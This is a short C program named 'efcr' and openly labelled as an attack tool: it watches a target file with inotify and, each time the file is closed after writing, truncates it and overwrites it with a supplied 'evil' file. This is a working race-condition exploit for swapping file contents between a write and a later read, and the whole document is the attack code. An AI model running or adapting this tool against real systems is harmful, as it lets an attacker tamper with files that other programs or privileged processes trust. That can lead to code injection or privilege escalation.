#include <stdlib.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/sendfile.h>
#include <sys/inotify.h>
#include <limits.h>

#define D(str) do { fprintf(stderr, "efcr: " str "\n"); } while(0)

int in_fd = -1;
int inofd = -1;

void __attribute__((noreturn)) usage(int ret)
{
	fprintf(stderr, "usage: efcr evil-content replace-this\n");
	exit(ret);
}

void open_evil_file(char *path)
{
	D("Opening evil file...");
	in_fd = open(path, O_RDONLY);
	assert(in_fd != -1);
	D("Evil file opened");
}

int check_for_close(char *path)
{
	int wd;
	char buf[sizeof(struct inotify_event) + NAME_MAX + 1];

	D("Initializing inotify fd...");
	assert((inofd = inotify_init()) != -1);

	D("Setting up inotify watch...");
	wd = inotify_add_watch(inofd, path, IN_CLOSE_WRITE);
	assert(wd != -1);

	/* blocking wait until we receive an event */
	read(inofd, &buf, sizeof(buf));

	inotify_rm_watch(inofd, wd);
	close(inofd);
	inofd = -1;

	D("file was just closed after writing! The race begins!");
	return 1;
}

void replace_evil_content(char *path)
{
	int fd;
	struct stat st;

	D("Replacing contents...");
	fd = open(path, O_WRONLY | O_TRUNC);
	assert(fd != -1);
	assert(fstat(in_fd, &st) != -1);
	lseek(in_fd, 0, SEEK_SET);
	sendfile(fd, in_fd, NULL, st.st_size);
	close(fd);
	D("... done.");
}

int main(int argc, char *argv[])
{
	if(argc != 3)
		usage(-1);

	open_evil_file(argv[1]);

	while(check_for_close(argv[2]))
		replace_evil_content(argv[2]);
	return EXIT_SUCCESS;
}
